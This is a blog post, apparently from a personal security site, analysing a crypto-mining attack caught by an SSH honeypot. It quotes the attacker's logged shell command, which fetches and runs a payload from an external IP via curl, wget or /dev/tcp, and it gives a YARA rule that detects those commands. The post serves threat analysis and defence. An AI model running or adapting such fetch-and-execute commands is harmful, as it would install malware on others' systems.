<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Miner · MoraCyberInsights
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Gabriel Mora">
<meta name="description" content="Is your computer mining for someone else’s gold?Link to headingBy Gabriel Mora
Introduction
In the ever-evolving landscape of cybersecurity understanding and mitigating attacks is crucial. Recently, my honeypot detected an intriguing crypto-mining attack originating from China. This blog post details my investigation shedding light on the methods used.
The Incident
On May 6th, 2024 my honeypot was targeted by a malicious actor attempting to deploy a crypto-mining payload.">
<meta name="keywords" content="blog,cybersecurity,personal">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Miner">
  <meta name="twitter:description" content="Is your computer mining for someone else’s gold?Link to headingBy Gabriel Mora
Introduction
In the ever-evolving landscape of cybersecurity understanding and mitigating attacks is crucial. Recently, my honeypot detected an intriguing crypto-mining attack originating from China. This blog post details my investigation shedding light on the methods used.
The Incident
On May 6th, 2024 my honeypot was targeted by a malicious actor attempting to deploy a crypto-mining payload.">

<meta property="og:url" content="https://moracyberinsights.github.io/posts/miner/">
  <meta property="og:site_name" content="MoraCyberInsights">
  <meta property="og:title" content="Miner">
  <meta property="og:description" content="Is your computer mining for someone else’s gold?Link to headingBy Gabriel Mora
Introduction
In the ever-evolving landscape of cybersecurity understanding and mitigating attacks is crucial. Recently, my honeypot detected an intriguing crypto-mining attack originating from China. This blog post details my investigation shedding light on the methods used.
The Incident
On May 6th, 2024 my honeypot was targeted by a malicious actor attempting to deploy a crypto-mining payload.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-16T22:05:20-05:00">
    <meta property="article:modified_time" content="2024-07-16T22:05:20-05:00">




<link rel="canonical" href="https://moracyberinsights.github.io/posts/miner/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://moracyberinsights.github.io/">
      MoraCyberInsights
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://moracyberinsights.github.io/posts/miner/">
              Miner
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2024-07-16T22:05:20-05:00">
                July 16, 2024
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              4-minute read
            </span>
          </div>
          
          
          
        </div>
      </header>

      <div class="post-content">
        
        <h1 id="is-your-computer-mining-for-someone-elses-gold">
  Is your computer mining for someone else’s gold?
  <a class="heading-link" href="#is-your-computer-mining-for-someone-elses-gold">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>By Gabriel Mora</strong></p>
<p><img src="/Bernie_meme.jpg" alt="Bernie meme"></p>
<p><strong>Introduction</strong></p>
<p>In the ever-evolving landscape of cybersecurity understanding and
mitigating attacks is crucial. Recently, my honeypot detected an
intriguing crypto-mining attack originating from China. This blog post
details my investigation shedding light on the methods used.</p>
<p><strong>The Incident</strong></p>
<p>On May 6th, 2024 my honeypot was targeted by a malicious actor
attempting to deploy a crypto-mining payload. The source of the attack
was traced to an IP address managed by Aliyun Computing Co., LTD in
Shenzhen, China. This incident provided a valuable opportunity to
analyze the attack vector, methodology, and potential mitigations.</p>
<p><strong>Firewall Logs</strong></p>
<p>The firewall recorded two connection attempts from the suspicious IP:</p>
<table>
<thead>
<tr>
<th><strong>Date</strong></th>
<th><strong>Time</strong></th>
<th><strong>Source IP</strong></th>
<th><strong>Source Port</strong></th>
<th><strong>Target IP</strong></th>
<th><strong>Target Port</strong></th>
<th><strong>Protocol</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>2024-05-06</td>
<td>02:54:17</td>
<td>39.108.186.231</td>
<td>16525</td>
<td>172.31.19.98</td>
<td>2222</td>
<td>TCP</td>
</tr>
<tr>
<td>2024-05-06</td>
<td>02:54:28</td>
<td>39.108.186.231</td>
<td>37700</td>
<td>172.31.19.98</td>
<td>2222</td>
<td>TCP</td>
</tr>
</tbody>
</table>
<p>https[://]isc.sans.edu/data/</p>
<p><strong>Subject Description</strong></p>
<p>The attack involved an attempt to download and execute a malicious file.
Using default credentials and living off the land techniques, the
attacker aimed to deploy a crypto miner. This method hijacks system
resources for cryptocurrency mining, providing the attacker with
financial gain at the expense of the compromised system.</p>
<p><strong>Analysis of the Activity</strong></p>
<p><strong>Log Analysis</strong></p>
<p>The playlog feature was used to analyze the attack:</p>
<p><code>python3 /srv/cowrie/bin/playlog ./b65fea451d07c3d5ff37c4b21496aa075078051a2c3145690babfa5956500ebf</code></p>
<p>By filtering the cowrie.json logs for the relevant timestamp &quot;02:54&quot;
and session ID a79d01830e6d, multiple entries were found revealing the
attacker's commands.</p>
<p>Sample of the logs found using grep to filter by session ID below:</p>
<pre><code>```nohup \$SHELL -c \\\&quot;curl http://125.124.222.170:60111/linux -o
/tmp/cETqZjW89H;

if \[ ! -f /tmp/cETqZjW89H \];

then wget http://125.124.222.170:60111/linux -O /tmp/cETqZjW89H;

fi;

if \[ ! -f /tmp/cETqZjW89H \];

then exec 6\&lt;\&gt;/dev/tcp/125.124.222.170/60111 &amp;&amp; echo -n \'GET /linux\'
\&gt;&amp;6 &amp;&amp; cat 0\&lt;&amp;6 \&gt; /tmp/cETqZjW89H &amp;&amp; chmod +x /tmp/cETqZjW89H
\...\\\&quot;```
</code></pre>
<p><img src="/Miner_post_figure1.png" alt="Figure 1"></p>
<p>Figure 1: Similar attacks by IP address.</p>
<p><strong>Malware Analysis</strong></p>
<p>The attacker attempted to download a file named linux using multiple
methods (curl, wget, and raw TCP connection). After the failed download
attempt, the cripts tried making the file executable using chmod and
subsequently attempted to execute with a long encoded argument likely
containing mining pool addresses, wallet IDs, or other configuration
details needed for proper execution.</p>
<p><strong>How can organizations detect and mitigate crypto-mining attacks on
their networks?</strong></p>
<p><strong>YARA Rule</strong></p>
<p>To detect this specific activity, I created a YARA rule which identified
222 instances of similar attacks, primarily from IP addresses located in
China. For more information on how to use YARA please reference YARA&rsquo;s
documentation [1]. The rule &ldquo;Miner&rdquo; is below:</p>
<pre><code>```rule Miner

{

meta:

description = \&quot;Detects potential miner attack\&quot;

author = \&quot;Gabriel Mora\&quot;

date = \&quot;2024-05-23\&quot;

version = \&quot;1.0\&quot;

strings:

\$min_curl = /curl
http:\\/\\/\[0-9\]{1,3}(\\.\[0-9\]{1,3}){3}:\[0-9\]+\\/linux -o
\\/tmp\\/\[a-zA-Z0-9\]+/

\$min_wget = /wget
http:\\/\\/\[0-9\]{1,3}(\\.\[0-9\]{1,3}){3}:\[0-9\]+\\/linux -O
\\/tmp\\/\[a-zA-Z0-9\]+/

\$min_tcp = /exec
6\&lt;\&gt;\\/dev\\/tcp\\/\[0-9\]{1,3}(\\.\[0-9\]{1,3}){3}\\/\[0-9\]+ &amp;&amp; echo
-n \'GET \\/linux\' \&gt;&amp;6 &amp;&amp; cat 0\&lt;&amp;6 \&gt; \\/tmp\\/\[a-zA-Z0-9\]+/

\$min_chmod = /chmod \\+x \\/tmp\\/\[a-zA-Z0-9\]+ &amp;&amp;
\\/tmp\\/\[a-zA-Z0-9\]+ \[a-zA-Z0-9+\\/\]+/

condition:

all of (\$min\*)

}```
</code></pre>
<p><strong>Attack Goals and MITRE ATT&amp;CK Framework</strong></p>
<p>The primary goal of the attack is to install a crypto miner, hijacking
system resources for mining cryptocurrencies. This technique falls under
several categories in the MITRE ATT&amp;CK framework:</p>
<ul>
<li>
<p><strong>Valid Accounts: Default Accounts [2] (T1078.001)</strong></p>
</li>
<li>
<p><strong>Command and Scripting Interpreter: Unix Shell [3] (T1059.004)</strong></p>
</li>
<li>
<p><strong>Impact: Resource Hijacking [4] (T1496)</strong></p>
</li>
</ul>
<p><strong>Mitigation Strategies</strong></p>
<p>To protect systems from similar attacks, consider the following
measures:</p>
<ol>
<li>
<p><strong>Password Policies [5] (M1027)</strong>: Change default usernames and
passwords immediately after installation.</p>
</li>
<li>
<p><strong>Execution Prevention [6] (M1038)</strong>: Use application control
where appropriate.</p>
</li>
<li>
<p><strong>Network Intrusion Prevention [7] (M1031)</strong>: Utilize network
signatures to identify and mitigate malicious traffic.</p>
</li>
</ol>
<p><strong>Who Would Benefit from This Information?</strong></p>
<ul>
<li>
<p><strong>Network Security Professionals</strong>: To enhance their detection and
mitigation strategies.</p>
</li>
<li>
<p><strong>System Administrators</strong>: To ensure the security and performance of
their systems.</p>
</li>
<li>
<p><strong>Cybersecurity Researchers</strong>: To study evolving attack vectors and
improve defense mechanisms.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>The methods used by attackers were identified by analyzing the detected
crypto-mining attacks and strategies were devised to mitigate similar
threats. Continuous monitoring, robust security policies, and proactive
measures are essential to safeguard against such malicious activities.
Crypto-mining attacks can severely degrade system performance, leading
to increased operational costs and potential downtime. Understanding and
mitigating these attacks is crucial for maintaining system integrity and
performance.</p>
<p>For more detailed information on the attacker's IP and related threat
intelligence, you can refer to:</p>
<ul>
<li>
<p>Shodan [8]</p>
</li>
<li>
<p>VirusTotal [9]</p>
</li>
<li>
<p>ISC [10]</p>
</li>
<li>
<p>CyberGordon [11]</p>
</li>
<li>
<p>AlienVault [12]</p>
</li>
<li>
<p>AbuseIPDB [13]</p>
</li>
</ul>
<p>Referenced links:</p>
<p>[1] https[://]yara.readthedocs.io/en/latest/</p>
<p>[2] https[://]attack.mitre.org/techniques/T1078/001/</p>
<p>[3] https[://]attack.mitre.org/techniques/T1059/004/</p>
<p>[4] https[://]attack.mitre.org/techniques/T1496/</p>
<p>[5] https[://]attack.mitre.org/mitigations/M1027/</p>
<p>[6] https[://]attack.mitre.org/mitigations/M1038/</p>
<p>[7] https[://]attack.mitre.org/mitigations/M1031/</p>
<p>[8] https[://]www.shodan.io/host/39.108.186.231</p>
<p>[9] https[://]www.virustotal.com/gui/ip-address/39.108.186.231</p>
<p>[10] https[://]isc.sans.edu/ipinfo/39.108.186.231</p>
<p>[11]https[://]cybergordon.com/r/ab379e5f-3b10-46e9-a1f6-09ea0fee8c03</p>
<p>[12] https[://]otx.alienvault.com/indicator/ip/39.108.186.231</p>
<p>[13] https[://]www.abuseipdb.com/check/39.108.186.231</p>

      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2017 -
    
    2024
     Gabriel Mora 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
